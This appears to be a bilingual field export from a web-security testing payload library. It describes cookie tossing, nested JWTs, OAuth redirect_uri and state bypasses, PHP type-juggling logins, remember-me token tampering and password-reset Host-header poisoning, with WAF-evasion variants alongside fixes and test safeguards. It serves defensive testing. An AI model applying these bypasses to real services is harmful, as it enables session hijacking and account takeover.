overview.en: This payload covers cookie scoping and same-name collision, testing whether an attacker can leverage Domain, Path and same-name write rules to shadow real credentials with forged session values. Validation injects multiple colliding cookies via script in one step, mapped to step 1.

vulnerability.zh: 根因在于服务端解析 Cookie 时未按作用域特异性取值：攻击者可经子域向父域投掷同名会话 Cookie，或写入更长 Path 的同名 Cookie——按 RFC 6265 排序规则更长 Path 排在 Cookie 头前列，伪造值因此可能排在合法值之前被优先读取。
vulnerability.en: The root cause is server cookie parsing that ignores scope specificity: same-name session cookies can be planted multiple times via subdomains or broad paths, and once concatenated in the request header the forged value may precede the legitimate one and be read first.

exploitation.zh: 第 1 步在目标页面上下文执行脚本写入四枚 marker Cookie，再以 Domain 属性写入伪造 session 值，随后请求受保护路径并核对服务端实际解析到的会话；伪造值生效或出现多值拼接即确认同名冲突可利用。成功判据以服务端会话决策为准。占位符在全局变量菜单替换；测试使用可回滚的合成会话。
exploitation.en: In step 1, execute the script in the target page context to write four marker cookies, then plant a forged session value with a Domain attribute, request the protected path, and check which session the server actually resolved; a forged value winning or multi-value concatenation confirms exploitable collision. Judge success by the server session decision. Replace placeholders via the global variables menu; use rollback-safe synthetic sessions.

mitigation.en: Unify session cookie name, Domain and Path to avoid same-name variants, resolve per RFC specificity rules taking the most specific value, and use prefixes like __Host for session cookies. After the fix, replay step 1: forged values should be ignored.

prerequisites.zh: 使用两个合成账户、隔离浏览器配置和固定无敏感字段标记对象，记录登录前后会话 ID 的哈希与主体。
prerequisites.en: Use two synthetic accounts, isolated browser profiles, and a fixed nonsensitive marker object, recording session-ID hashes and principals before and after login.

prerequisites.zh: 若检查明文传输，只在自有封闭网络和测试流量中抓包；Cookie 域、路径、SameSite 和浏览器版本必须明确。
prerequisites.en: If reviewing cleartext transport, capture only owned test traffic on an isolated network; document cookie domain, path, SameSite mode, and browser version.

analysis.zh: 阳性会话固定要求登录前受控会话 ID 在登录后未轮换且另一测试客户端可访问同一主体；Cookie Tossing 要求子域可设置的同名 Cookie 被主域安全逻辑选中；SameSite 仅证明凭据随导航发送，不能证明响应可读或状态变更。缺少属性、抓到测试 Cookie 或随机性工具给出低分本身都不是劫持。
analysis.en: Session fixation requires a controlled pre-login ID to survive authentication and authorize the same principal from another test client. Cookie tossing requires a same-name cookie set by a subdomain to be selected by main-domain security logic. SameSite can show credentials sent on navigation but not response readability or state change. A missing attribute, captured test cookie, or low randomness score alone is not hijacking.

opsecTips.zh: 仅复用可撤销的合成会话并读取一个标记对象；不得捕获第三方流量、真实 Cookie 或触发资金与资料变更。
opsecTips.en: Replay only revocable synthetic sessions and read one marker object; do not capture third-party traffic, real cookies, or trigger financial or profile changes.

opsecTips.zh: 注销全部测试会话，删除 Cookie、抓包和临时脚本，清理浏览器站点数据并恢复 HTTPS 与 Cookie 策略。
opsecTips.en: Log out all test sessions, delete cookies, captures, and temporary scripts, clear browser site data, and restore HTTPS and cookie policy.

description.zh: 绕过按单一路径读取 Cookie 的逻辑：父子路径同名 Cookie 并存干扰服务端取值。成功判据：请求头中出现两个同名 Cookie 且解析取到攻击者值。
description.en: Bypasses single-path cookie reads by co-locating the same name on parent and child paths. Success: request carries both cookies and the attacker value wins.

description.zh: 扩大同名 Cookie 作用域干扰子域/父域解析顺序。成功判据：子域请求携带投递的 Cookie。
description.en: Widens the duplicate cookie's scope to interfere with subdomain parsing order. Success: subdomain requests carry the tossed cookie.

description.zh: 绕过按名称精确匹配的清理/校验逻辑：百分号编码下划线。成功判据：同名逻辑键被双重写入。
description.en: Bypasses name-exact cleanup logic by percent-encoding the underscore in the name. Success: the logical key gets written twice.

name.zh: JWT Claim 与嵌套令牌验证
name.en: JWT Claim and Nested Token Validation

description.zh: 篡改 exp/sub 等声明并构造嵌套 JWT，验证必需声明与嵌套令牌的校验强度。
description.en: Tampering exp and sub claims and nesting JWTs inside token fields exposes missing required-claim checks and unverified inner tokens, showing authorization decisions inherit attacker-controlled identity data.

overview.zh: 该 Payload 覆盖 JWT 嵌套令牌校验场景，检验服务端是否仅采信外层已验签声明并拒绝内嵌的未签名二次令牌。验证维度为携带内嵌未签名令牌的对照载荷单步执行，对应第 1 步。
overview.en: This payload covers JWT claim and nested-token validation, testing whether the server checks sub, aud and iss and rejects embedded unsigned secondary tokens. Validation submits claim variants and nested-token payloads as controls, mapped to step 1.

vulnerability.zh: 根因在于服务端对声明取值做透传信任并解析嵌套令牌：修改后的 sub、缺失的 aud 校验或未签名 inner_token 被当作身份依据，权限判定随之被接管。
vulnerability.en: The root cause is pass-through trust of claim values and parsing of nested tokens: a modified sub, unchecked aud, or unsigned inner_token becomes the identity basis, hijacking privilege decisions.

exploitation.zh: 第 1 步按脚本构造携带 marker sub 与内嵌未签名 inner_token 的已签名外层载荷并提交受保护端点，记录服务端对声明与嵌套令牌的校验决策：嵌套令牌被解析或其声明被采信即确认校验缺失。成功判据以声明决策与响应为准。占位符在全局变量菜单替换；全程使用合成身份与只读标记。
exploitation.en: In step 1, build payloads carrying a marker sub, anomalous aud and iss, and an embedded unsigned token per the script and submit each to the protected endpoint, recording per-claim validation decisions; trusted anomalous claims or parsed nested tokens confirm missing checks. Judge success by claim decisions and responses. Replace placeholders via the global variables menu; use synthetic identities and the read-only marker throughout.

mitigation.zh:

vulnerability.zh: 根因在于授权中间件只覆盖部分方法或按规范化前的路径判定：方法白名单遗漏 HEAD 与 OPTIONS，或 H2 路径与 H1 规范化不一致，攻击者借变换抵达受保护资源。

exploitation.zh: 第 1 步对受保护 marker 路径逐一发送 GET、HEAD、OPTIONS 等方法变体，任一方法返回 200 或数据即确认方法级授权缺失；第 2 步以 HTTP/2 prior-knowledge 重复请求并附带 X-Original-URL 对照，观察路由与授权判定是否随协议改变。成功判据以响应状态与只读标记为准。占位符在全局变量菜单替换为目标值。

mitigation.en: Centralize authorization at the routing layer covering every method and explicitly reject unregistered verbs; normalize paths before authorization and keep behavior consistent across protocols. After the fix, replay steps 1 and 2: all variants should be uniformly rejected.

name.zh: OAuth 重定向 URI 精确匹配

description.zh: 提交外部域、路径穿越与 @ 混淆等 redirect_uri 变体，验证授权服务器是否对预注册回调精确匹配。
description.en: Submits external-domain, path-traversal, and @-confusion redirect_uri variants, proving the authorization server matches callbacks by prefix or containment instead of exact comparison so the code goes to an attacker-controlled address.

subCategory.zh: OAuth 与 OIDC 流程攻击

overview.zh: 该 Payload 覆盖 OAuth 重定向 URI 精确匹配场景，检验授权服务器是否只接受预注册的完整回调地址。验证维度为路径追加、斜杠尾缀与编码变体的 redirect_uri 矩阵单步执行，对应第 1 步。
overview.en: This payload covers OAuth redirect_uri exact matching, testing whether the authorization server accepts only the fully pre-registered callback address. Validation runs a redirect_uri matrix of path appends, trailing slashes and encoding variants in one step, mapped to step 1.

vulnerability.zh: 根因在于授权服务器以字符串前缀或包含关系代替完整比对：redirect_uri 追加路径、尾缀斜杠或编码变体仍被视为合法回调，授权码随之发往攻击者可控地址。
vulnerability.en: The root cause is the authorization server comparing by string prefix or containment instead of full equality: redirect_uri variants with appended paths, trailing slashes or encodings still count as the registered callback, sending authorization codes to attacker-controlled addresses.

exploitation.zh: 第 1 步按脚本把注册回调的追加路径、尾缀斜杠、查询占位与编码变体逐条作为 redirect_uri 提交授权端点，观察是否返回 code 或执行跳转：任一未注册变体仍完成签发即确认绑定不严格。成功判据以授权服务器的错误码与重定向行为为准。占位符在全局变量菜单替换；先用合法值标定基线再比较差异。
exploitation.en: In step 1, submit registered-callback variants with appended paths, trailing slashes, query placeholders and encodings one by one as redirect_uri to the authorization endpoint, watching for code issuance or a redirect; any unregistered variant completing issuance confirms loose binding. Judge success by the authorization server error codes and redirect behavior. Replace placeholders via the global variables menu; baseline with the legitimate value first, then compare differences.

mitigation.zh:
授权服务器对 redirect_uri 执行注册值的完整字符串精确比对（恒时比较），禁止通配、前缀与忽略查询的宽松模式；未注册变体返回 invalid_request。
    # Python/Flask 授权端点
    import hmac
    if not hmac.compare_digest(redirect_uri or '', client.registered_redirect_uri):
        return jsonify(error='invalid_request'), 400
    # /callback/extra、尾缀斜杠、编码变体均不等于注册值，全部拒绝
mitigation.en: The authorization server must compare redirect_uri against the registered value in full, banning wildcard, prefix and query-ignoring modes. After the fix, replay the step 1 matrix: every unregistered variant should return invalid_request.

prerequisites.zh: 每轮使用新的 state、nonce、PKCE verifier 和一次性 code，测试令牌仅包含无敏感字段 scope。
prerequisites.en: Use fresh state, nonce, PKCE verifier, and one-time code for every run, with test tokens limited to nonsensitive scopes.

analysis.zh: 阳性需要证明错误会话可完成账户绑定、未登记 redirect URI 收到可兑换 code/token、未授权 scope 被资源服务器接受，或面向另一个客户端/受众的令牌访问同一标记资源。授权页错误、候选 URI 被反射、浏览器导航、不可兑换 code、fragment 出现在地址栏或资源服务器正确拒绝都不是漏洞证据。
analysis.en: Positive evidence requires the wrong session to complete account binding, an unregistered redirect URI to receive a redeemable code or token, an unauthorized scope to be accepted, or a token for another client or audience to access the same marker resource. Authorization errors, reflected candidate URIs, browser navigation, unredeemable codes, fragments in the address bar, or correct resource-server rejection are not evidence.

opsecTips.zh: 只使用短期测试 code/token 并访问一个只读标记资源；不得使用窃取令牌、管理员 scope 或真实第三方客户端。

opsecTips.zh: 撤销 code、access token 与 refresh token，删除测试绑定和回调日志，恢复客户端登记与 consent 配置。

description.en: Bypasses prefix matching: encoded traversal segments escape the callback directory after backend normalization. Success: code redirects to the evil path.

description.zh: 尾点与大写主机 — 针对先规范化后比对的回调白名单实现：授权服务器若对 URI 主机做 DNS 等价规范化（去尾点、统一大小写），尾点与大写变体会通过注册值比对。成功判据：重定向仍指向合法域但绕过注册值比对。

description.en: Bypasses allowlist prefix matching: the userinfo before @ makes the real host the attacker's. Success: the code is sent to {ATTACKER_HOST}.

description.zh: 绕过按标准单斜杠匹配的白名单：解析器容错接受多斜杠。成功判据：授权码发往攻击者域。
description.en: Bypasses single-slash allowlist matching since tolerant parsers accept extra slashes. Success: the code is issued to the attacker host.

description.zh: 编码 #/? 尾缀在规范化层剥离，白名单比对与实际跳转分离。成功判据：比对通过且跳转到攻击者域。
description.en: Encoded #/? suffixes strip at normalization, splitting allowlist comparison from the actual redirect. Success: comparison passes and the redirect hits the attacker host.

name.zh: OAuth state 事务绑定

description.zh: 篡改、复用或移除 state 参数，验证授权请求与回调浏览器会话的绑定是否成立。
description.en: Tampering with, reusing, or removing the state parameter shows the callback handler never compares it against the browser session, enabling login CSRF where a cross-site page exchanges an attacker's code into the victim's session.

subCategory.zh: OAuth 与 OIDC 流程攻击

overview.zh: 该 Payload 覆盖 OAuth state 事务绑定场景，检验回调端点是否把授权响应绑定到发起授权的浏览器会话，阻断跨站伪造回调。验证维度为错误 state 的 img 载荷阴性样例，对应第 1 步。
overview.en: This payload covers OAuth state transaction binding, testing whether the callback endpoint binds the authorization response to the browser session that started the flow, blocking forged cross-site callbacks. Validation uses an img payload with a wrong state as a negative sample, mapped to step 1.

vulnerability.zh: 根因在于回调处理缺少 state 与会话的比对：跨站页面可携带任意 code 与 state 触发回调，受害者在不知情下把攻击者的授权码兑换进自己的会话，形成登录 CSRF。
vulnerability.en: The root cause is the callback handler never comparing state against the session: a cross-site page can trigger the callback with arbitrary code and state, silently exchanging the attacker's authorization code inside the victim's session, producing login CSRF.

exploitation.zh: 第 1 步在跨站页面放置 img 加载带伪造 code 与错误 state 的回调地址，核对服务端日志与目标会话：回调被拒绝且无账号绑定即证明 state 绑定生效，登录被建立即确认登录 CSRF。成功判据以回调拒绝记录为准。占位符在全局变量菜单替换；使用合成 code 避免真实授权流转。
exploitation.en: In step 1, place an img on a cross-site page loading the callback with a forged code and wrong state, then check server logs and the target session; a rejected callback with no account binding proves state binding, an established login confirms login CSRF. Judge success by callback-rejection records. Replace placeholders via the global variables menu; use synthetic codes to avoid real authorization flows.

mitigation.en: Generate a cryptographically random state at flow start, store it in the session, compare strictly on callback and consume once; terminate immediately on mismatch. After the fix, replay step 1: wrong-state callbacks should all be rejected.

name.zh: 认证弱类型比较绕过

description.zh: 把用户名/密码提交为数组、true 或 0 形态，利用 PHP 松散比较绕过凭据校验。
description.en: Submits usernames and passwords as arrays, true, or 0 using bracket syntax, exploiting PHP loose comparison and missing type assertions so the credential check takes an unexpected branch and passes.

subCategory.zh: 凭证注入与弱类型登录绕过

overview.zh: 该 Payload 覆盖 PHP 凭据类型混淆场景，检验认证接口把数组等非字符串凭据传入比较函数时是否触发松散比较或异常放行。验证维度为数组参数与结构化 JSON 凭据两组样例，对应第 1 至第 2 步。
overview.en: This payload covers PHP credential type confusion, testing whether non-string credentials such as arrays trigger loose comparison or exceptional acceptance in the authentication path. Validation covers array-parameter and structured-JSON credential samples, mapped to steps 1 and 2.

vulnerability.zh: 根因在于 PHP 参数解析允许同名参数携带方括号语法生成数组，而弱比较或未做类型断言的校验逻辑遇到数组时行为异常，攻击者借此绕过口令比较。
vulnerability.en: The root cause is PHP parameter parsing that turns bracket-suffixed parameters into arrays, while loose comparison or missing type assertions behave abnormally on arrays, letting attackers bypass the password check.

exploitation.zh: 第 1 步以 user 与 pass 的数组语法提交登录参数，认证通过或返回特征报错即确认类型混淆；第 2 步按脚本提交数组与结构化 JSON 凭据的阴性对照，任何非字符串值被接受即为漏洞，全部拒绝则说明已做类型断言。成功判据以认证结果与日志为准。占位符在全局变量菜单替换；样例仅用于授权测试。
exploitation.en: In step 1, submit login parameters using array syntax for user and pass; authentication success or a characteristic error confirms type confusion. In step 2, submit the array and structured-JSON negative controls per the script; any accepted non-string value is the flaw, uniform rejection shows type assertions are in place. Judge success by authentication results and logs. Replace placeholders via the global variables menu; use samples only in authorized tests.

mitigation.en: Assert explicitly that credentials are strings at the authentication entry, and compare with constant-time strict functions instead of loose equality. After the fix, replay steps 1 and 2: all non-string credentials should be rejected.

prerequisites.zh: 确认每个输入最终到达 SQL、MongoDB 查询、PHP 比较、反向代理还是应用路由，禁止跨解释器推断。
prerequisites.en: Identify whether each input reaches SQL, a MongoDB query, PHP comparison, a reverse proxy, or an application route; do not infer behavior across interpreters.

analysis.zh: 阳性证据是同一无权限主体仅改变一个输入后获得已认证主体或读取同一受保护对象，并由应用授权日志、数据库查询或代理到后端的规范化路径共同确认。登录页返回 200、错误文本变化、前端状态被修改、伪造头被回显、语法错误或不同路由返回公开内容都不是绕过证据。
analysis.en: Positive evidence requires the same unauthorized principal to gain an authenticated principal or read the same protected object after one input change, corroborated by authorization logs, database queries, or proxy-to-backend canonical paths. HTTP 200 on a login page, changed error text, client-side state edits, reflected spoofed headers, syntax errors, or public content from another route are not bypass evidence.

opsecTips.zh: 只读取一个不含敏感字段的固定标记对象；不得调用 DELETE、写入、管理员变更或真实账户操作。
opsecTips.en: Read only one fixed marker object without sensitive fields; do not invoke DELETE, writes, administrator changes, or real-account operations.

opsecTips.zh: 删除测试账户与标记对象，清空 Cookie 和代理缓存，恢复可信代理与统一规范化配置，并核对未产生状态变更。
opsecTips.en: Delete test accounts and marker objects, clear cookies and proxy caches, restore trusted-proxy and canonicalization settings, and verify that no state changed.

description.zh: 绕过仅检查表单键值对的 WAF 规则：改为 JSON 体提交并保持数组类型混淆。成功判据：非字符串凭据被接受或类型错误处理差异暴露。
description.en: Bypasses WAF rules that only inspect form pairs by switching to a JSON body while keeping array type confusion. Success: non-string credentials accepted or type-error divergence exposed.

description.zh: 绕过匹配字面 pass[]= 的特征规则：百分号编码中括号，服务端仍解析为数组。成功判据：数组凭据触达 PHP 弱比较逻辑。
description.en: Bypasses literal pass[]= signature matching by percent-encoding the brackets; the backend still parses them as arrays. Success: array credentials reach the weak comparison.

description.zh: 绕过按 application/x-www-form-urlencoded 解析体检查的 WAF：改用 multipart 编码携带数组参数。成功判据：类型混淆仍生效。
description.en: Bypasses WAFs inspecting only urlencoded bodies by switching to multipart while carrying array parameters. Success: type confusion still triggers.

description.zh: 数字与布尔交替探测松散比较窗口（PHP == 语义）。成功判据：任一非口令值通过比较。
description.en: Alternating numeric and boolean forms probes loose-comparison windows (PHP == semantics). Success: any non-password value passes comparison.

description.zh: 空数组/空对象在 PHP 8 前后比较行为不同，定位版本相关弱点。成功判据：[] 与 [[]] 任一通过认证。
description.en: Empty arrays/objects compare differently before and after PHP 8, locating version-dependent weakness. Success: either [] or [[]] authenticates.

description.zh: 科学计数法魔数 — 绕过松散比较的口令校验：0e 开头且后接纯数字的字符串在 PHP == 下按科学计数法解析为 0，两个 0e 形态值互相相等；需配合服务端存储哈希同为 0e 形态的场景。成功判据：哈希后为 0e 形态的魔数口令通过校验。
description.en: 0e-style hashes loosely compare equal to 0, bypassing password checks. Success: the 0e value passes comparison.

description.zh: 把类型混淆凭据逐条提交登录端点；宽松比较导致认证通过，即确认弱类型凭据比较漏洞。
description.en: Submit each type-confused credential to the login endpoint; authentication passing under loose comparison confirms the weak-typing flaw.

name.zh: 持久登录令牌完整性

description.zh: 拆解持久登录令牌结构，验证是否含可预测分量或未签名数据。
description.en: Decodes the persistent login token's structure and modifies its username and expiry components, showing the token is reversible encoding without a keyed signature and the server restores sessions from attacker-rewritten content.

overview.zh: 该 Payload 覆盖持久登录令牌完整性场景，检验记住我 Cookie 是否携带签名或 MAC，篡改过期时间与用户名后能否通过验证。验证维度为解码、改写与重放的三段单步流程，对应第 1 步。
overview.en: This payload covers persistent-login token integrity, testing whether remember-me cookies carry a signature or MAC and reject tampering with expiry and username. Validation decodes, rewrites and resubmits in a single three-part step, mapped to step 1.

vulnerability.zh: 根因在于持久令牌仅为可逆编码而未附加密钥校验：base64 解开即可改用户名与过期时间并重编码，服务端按内容直接恢复会话。
vulnerability.en: The root cause is a persistent token that is merely reversibly encoded without keyed verification: base64 can be decoded to change the username and expiry then re-encoded, and the server restores a session straight from the content.

exploitation.zh: 第 1 步按脚本先 base64 解码样例令牌查看结构，改写过期时间与用户名后重新编码提交登录端点，同时提交未改动的对照值：篡改令牌被接受即确认完整性缺失，被拒绝则说明存在签名校验。成功判据以认证结果与日志为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, decode the sample token with base64 to inspect its structure, rewrite the expiry and username, re-encode and submit to the login endpoint alongside an untouched control; acceptance of the tampered token confirms missing integrity, rejection shows signature verification exists. Judge success by authentication results and logs. Replace placeholders via the global variables menu.

mitigation.zh:
持久令牌改为带密钥签名结构并绑定随机系列号：内容防篡改由签名保证，系列号用于令牌族管理，服务端只存令牌哈希。
    from itsdangerous import URLSafeTimedSerializer
    s = URLSafeTimedSerializer(SECRET_KEY, salt='remember-me')
    token = s.dumps({'uid': user.id, 'series': secrets.token_hex(16)})
    data = s.loads(token, max_age=30 * 86400)  # 验签失败整体拒绝
mitigation.en: Build persistent tokens as HMAC-signed or encrypted structures bound to a random series, verifying signature and series server-side. After the fix, replay step 1: tampered tokens should be rejected and trigger family revocation.

printf "%s" "cGF5bG9hZGVyOjE5OTk5OTk5OTk6UEFZTE9BREVSX01BUktFUg==" | base64 -d

# Expected: a modified synthetic cookie is rejected; readable encoding alone is not forgery.

prerequisites.zh: 使用可撤销的合成账户和隔离浏览器，记录 Remember-Me Cookie 的名称、属性、服务端令牌记录、设备会话和撤销事件。
prerequisites.en: Use a revocable synthetic account and isolated browser, recording remember-me cookie name, attributes, server token record, device sessions, and revocation events.

prerequisites.zh: Shiro 测试仅在确认版本、cipher mode、密钥配置和可销毁 Java 容器后进行，反序列化链替换为无进程本地 canary。
prerequisites.en: Test Shiro only after confirming version, cipher mode, key configuration, and a disposable Java container, replacing deserialization chains with a process-free local canary.

analysis.zh: 普通令牌缺陷要求修改或跨设备重放 Cookie 后建立错误主体，且服务端日志确认令牌未正确绑定、签名或撤销。Shiro 缺陷要求目标版本和密钥条件匹配，并由反序列化审计触发无害 canary；deleteMe 响应、Base64 可解码、序列化魔数、默认密钥在字典中或工具生成密文都不是 RCE 证据。
analysis.en: A normal token flaw requires a modified or replayed cookie to create the wrong principal with server logs confirming failed binding, integrity, or revocation. A Shiro flaw requires matching version and key conditions plus a harmless deserialization canary. A deleteMe response, Base64 decoding, serialization magic, a default key in a list, or tool-generated ciphertext is not RCE evidence.

opsecTips.zh: 仅访问一个只读标记对象；不得生成命令执行 gadget、外连回调、真实管理员 Cookie 或跨用户持久会话。
opsecTips.en: Access only one read-only marker object; do not generate command-execution gadgets, callbacks, real administrator cookies, or persistent cross-user sessions.

opsecTips.zh: 注销所有设备、撤销持久令牌并轮换测试密钥，删除 Cookie、序列化文件和工具输出，销毁 Java 容器。
opsecTips.en: Log out all devices, revoke persistent tokens and rotate test keys, delete cookies, serialized files, and tool output, and destroy the Java container.

description.zh: 绕过截断比较或未校验实现：篡改过期时间戳并保留畸形签名。成功判据：令牌仍被接受为有效登录。
description.en: Bypasses truncated-comparison or missing verification by tampering the timestamp with a malformed signature. Success: token still accepted as a valid login.

description.zh: 换 URL 安全字母表绕过字符集严格校验。成功判据：变形令牌通过完整性检查。
description.en: Switches to the URL-safe alphabet to bypass strict charset validation. Success: mutated token passes integrity checks.

description.zh: 额外冒号破坏解析对齐，检验拆分与校验是否分离。成功判据：错位令牌仍认证成功。
description.en: An extra colon misaligns parsing to test whether splitting and validation are separate. Success: misaligned token still authenticates.

name.zh: 持久登录令牌撤销与重放
name.en: Persistent Login Token Revocation and Replay

description.zh: 重放已注销的 RememberMe 令牌，验证服务端撤销是否即时生效。
description.en: Replays a RememberMe token after logout, proving revocation only clears the client cookie while the server-side token record remains valid, letting a thief reuse the same credential indefinitely.

overview.zh: 该 Payload 覆盖持久登录令牌撤销与重放场景，检验注销或盗用事件后旧令牌是否被立即吊销失效。验证维度为多次登录取指纹再撤销重放的单步流程，对应第 1 步。
overview.en: This payload covers persistent-login token revocation and replay, testing whether old tokens are revoked and dead immediately after logout or theft events. Validation logs in multiple times to fingerprint tokens, then revokes and replays in a single flow, mapped to step 1.

vulnerability.zh: 根因在于撤销操作未使已签发令牌失效：注销只清理客户端 Cookie，服务端令牌记录仍有效，窃取者可长期重放同一记住我凭据。
vulnerability.en: The root cause is revocation that fails to invalidate issued tokens: logout only clears the client cookie while the server-side token record stays valid, letting thieves replay the same remember-me credential indefinitely.

exploitation.zh: 第 1 步按脚本连续三次以记住我登录并分别计算令牌哈希确认唯一性，随后执行注销或撤销操作，再用撤销前的令牌请求受保护端点：被拒绝即证明撤销生效，继续获得会话即确认重放缺陷。成功判据以响应与撤销日志为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, log in three consecutive times with remember-me, hashing each token to confirm uniqueness, then perform logout or revocation and replay the pre-revocation token against a protected endpoint; rejection proves revocation works, a granted session confirms the replay flaw. Judge success by responses and revocation logs. Replace placeholders via the global variables menu.

mitigation.zh:
注销与盗用检测时立即吊销服务端整个令牌族，记住我校验只认库内哈希且逐次比对，轮换链断裂即判定重用。
    # 注销：吊销整个令牌族
    UPDATE remember_tokens SET revoked_at = NOW()
     WHERE user_id = %s AND series = %s;
    row = db.one("SELECT token_hash FROM remember_tokens "
                 "WHERE series=%s AND revoked_at IS NULL", series)
    if not row or not compare_digest(row.token_hash, sha256(token)): reject()
mitigation.en: Delete server-side token records and revoke the whole token family immediately on logout or theft detection, validating remember-me against hashed storage each time. After the fix, replay step 1: post-revocation tokens must all be dead.

description.zh: 为持久登录令牌撤销与重放准备合成主体、固定只读标记和服务端日志基线。
description.en: Prepare synthetic principals, a fixed read-only marker, and server-log baselines for Persistent Login Token Revocation and Replay.

description.zh: 只执行当前验证卡的第一条样例，并保持账户、会话和目标对象不变。

attackChain.payload:
for i in 1 2 3; do
  curl -sS --max-time 5 -c "remember-${i}.cookies" -d "username=payloader&password=PAYLOADER_TEST&remember=1" http://127.0.0.1:8080/login
  sha256sum "remember-${i}.cookies"
  sleep 1
done
# Compare uniqueness, expiry, rotation, and server token records; do not infer serialization from appearance alone.

description.zh: 多次登录分别保存 remember 令牌并按值去重统计，检验令牌是否随会话轮换。成功判据：uniq -c 输出中存在计数大于 1 的令牌值，即多个会话复用同一令牌、登录时未轮换。
description.en: Generates remember tokens across sessions then counts reuse after rotation. Success: old tokens still count after rotation (revocation failure).

name.zh: 密码重置流程状态

description.zh: 跳步直接调用重置流程的后端端点，验证服务端状态机是否强制按序执行。
description.en: Calls the later endpoints of the reset flow directly, skipping intermediate steps, and verifies whether the server-side state machine enforces ordering or trusts request parameters at the set-password step.

overview.zh: 该 Payload 覆盖密码重置流程状态完整性场景，检验设置新口令端点是否要求已通过验证的流程状态，而非接受直连请求。验证维度为跳过验证直接调用设密端点的单步样例，对应第 1 步。
overview.en: This payload covers password-reset flow-state integrity, testing whether the set-password endpoint requires a validated flow state instead of accepting direct calls. Validation calls the set-password endpoint directly, skipping verification, in one step, mapped to step 1.

vulnerability.zh: 根因在于重置流程的多步状态仅存于前端或未做服务端串联：设密端点信任请求参数本身，攻击者绕过令牌验证步骤即可直接提交新口令。
vulnerability.en: The root cause is multi-step reset state kept only in the frontend or not chained server-side: the set-password endpoint trusts request parameters themselves, so attackers skip token verification and submit a new password directly.

exploitation.zh: 第 1 步携带合成账号与 marker 新口令直接调用设密端点并附加 dry_run 标记，服务端拒绝缺失流程状态即证明串联完整，接受请求即确认流程状态校验缺失。成功判据以响应状态与 dry_run 结果为准。占位符在全局变量菜单替换；不实际修改任何账号口令。
exploitation.en: In step 1, call the set-password endpoint directly with a synthetic account and a marker new password plus a dry_run flag; rejection for missing flow state proves proper chaining, acceptance confirms the missing state validation. Judge success by response status and the dry_run outcome. Replace placeholders via the global variables menu; never actually change any account password.

mitigation.en: Record verified status in a server-side session or one-time flow ticket, require it at the set-password endpoint bound to the account, and void the ticket on completion. After the fix, replay step 1: direct calls should be rejected.

prerequisites.zh: 使用自有邮件沙箱、两个合成账户和可回滚密码，记录每个重置请求、令牌哈希、账户 ID 与邮件任务 ID。
prerequisites.en: Use an owned mail sandbox, two synthetic accounts, and rollback passwords, recording each reset request, token hash, account ID, and mail-job ID.

prerequisites.zh: 固定应用公开基址和可信代理配置，所有回调域均为自有测试域，且令牌尝试次数受严格预算控制。
prerequisites.en: Fix the application's public base URL and trusted-proxy configuration, use only owned callback domains, and strictly budget token attempts.

analysis.zh: 阳性证据分别是邮件中的重置链接被不可信 Host 改写并把测试令牌送到受控域；低权限请求可重置另一合成账户；已用或过期令牌再次改变密码；或令牌在预算内可由已知生成规律预测。邮件未到达、响应 200、链接文本反射、状态码差异或脚本猜中自身生成的值都不是证据。
analysis.en: Positive evidence is an untrusted Host changing a mailed reset link and delivering a test token to an owned domain, an underprivileged request resetting another synthetic account, a used or expired token changing a password again, or a token predicted from a known generation rule within budget. Missing mail, HTTP 200, reflected link text, status differences, or a script matching its own generated value are not evidence.

opsecTips.zh: 只对合成账户执行一次可回滚密码变更；不得向真实收件人发信、遍历完整验证码空间或提交真实令牌。
opsecTips.en: Perform at most one reversible password change on a synthetic account; do not message real recipients, enumerate full code spaces, or submit real tokens.

opsecTips.zh: 撤销全部测试令牌，恢复合成账户密码，删除邮件、回调日志和临时脚本，并核对没有未完成重置任务。
opsecTips.en: Revoke all test tokens, restore synthetic passwords, delete mail, callback logs, and temporary scripts, and verify no reset jobs remain pending.

description.zh: 绕过流程状态机：直接请求末步端点跳过中间校验。成功判据：无令牌情况下口令被修改。
description.en: Bypasses the flow state machine by hitting the final step directly. Success: password changes without any token.

description.zh: 绕过表单层的状态字段强制检查：换 JSON 通道提交。成功判据：跳步重置成功。
description.en: Bypasses form-layer state enforcement by switching to the JSON channel. Success: step-skipping reset succeeds.

description.zh: 伪造流程步骤字段满足状态检查。成功判据：服务端按已验证状态接受重置。
description.en: Forges the step field to satisfy state validation. Success: server accepts the reset as an already-verified state.

name.zh: 密码重置主机头绑定

description.zh: 篡改 Host 头触发密码重置邮件，验证重置链接是否从不可信 Host 派生并劫持令牌。
description.en: Tampering the Host or X-Forwarded-Host header when requesting a password reset shows the reset link is derived from the untrusted header, delivering the one-time token to an attacker-controlled domain.

overview.zh: 该 Payload 覆盖密码重置链接的 Host 头绑定场景，检验应用生成重置 URL 时是否信任请求中的 Host 与派生头。验证维度为原始报文双 Host 对照、curl 多 Host 变体与 dry_run 触发三步，对应第 1 至第 3 步。
overview.en: This payload covers password-reset link Host-header binding, testing whether the application trusts request Host and derived headers when generating reset URLs. Validation covers a raw dual-Host comparison, curl Host variants, and a dry-run trigger, mapped to steps 1 through 3.

vulnerability.zh: 根因在于重置链接使用请求头动态拼接主机名而非配置内的固定域名：攻击者提交带恶意 Host 或 X-Forwarded-Host 的重置请求，邮件中的链接即指向受控域并带走一次性令牌。
vulnerability.en: The root cause is building reset links from request headers instead of a configured fixed domain: submitting a reset request with a malicious Host or X-Forwarded-Host makes the emailed link point at the attacker domain, carrying the one-time token with it.

exploitation.zh: 第 1 步发送携带不同 Host 的原始 POST 报文，观察响应或模拟邮件中重置链接的主机部分；第 2 步用 curl 分别以 app 与 callback 域名发 Host 请求，比对链接派生结果；第 3 步以 dry_run 参数触发重置流程并留档生成的链接。任一链接指向注入域即确认主机派生可操纵。占位符在全局变量菜单替换；全部使用实验收件箱避免打扰真实用户。
exploitation.en: In step 1, send raw POST messages with different Host values and inspect the host portion of the reset link in the response or a simulated email. In step 2, use curl with app and callback domain Host headers and compare link derivation. In step 3, trigger the reset flow with a dry_run parameter and archive the generated link. Any link pointing at the injected domain confirms manipulable host derivation. Replace placeholders via the global variables menu; use lab mailboxes only to avoid disturbing real users.

mitigation.en: Fix reset-link hosts to the server-configured domain, ignore request Host and forwarded headers, and reject requests with anomalous Host values. After the fix, replay steps 1 through 3: links should always land on the legitimate domain.

description.en: Bypasses single-Host validation via duplicate Host headers that some proxies concatenate when deriving the reset link. Success: emailed link points to the callback domain.

description.zh: 绕过对 Host 头的清洗：链接主机派生自 X-Forwarded-Host。成功判据：重置链接域名为 callback。
